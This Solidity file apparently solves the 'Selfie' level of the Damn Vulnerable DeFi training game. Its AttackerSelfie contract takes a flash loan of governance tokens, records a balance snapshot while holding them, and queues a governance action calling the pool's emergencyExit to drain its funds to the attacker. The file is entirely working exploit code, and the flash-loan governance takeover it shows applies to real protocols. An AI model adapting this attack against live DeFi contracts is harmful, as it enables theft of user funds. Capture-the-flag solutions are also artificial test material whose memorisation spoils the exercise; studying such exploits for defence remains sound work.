// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./ISimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackerSelfie is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    address immutable internal governance;
    uint public actionId;

    constructor (address _governance) {
        governance = _governance;
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 /*fee*/,
        bytes calldata /*data*/
    ) external returns (bytes32) {
        DamnValuableTokenSnapshot(token).snapshot();

        bytes memory data = abi.encodeWithSelector(
            SelfiePool.emergencyExit.selector, 
            initiator
        );
        actionId = ISimpleGovernance(governance).queueAction(msg.sender, 0, data);

        ERC20(token).approve(msg.sender, amount);
        return CALLBACK_SUCCESS;
    }
}
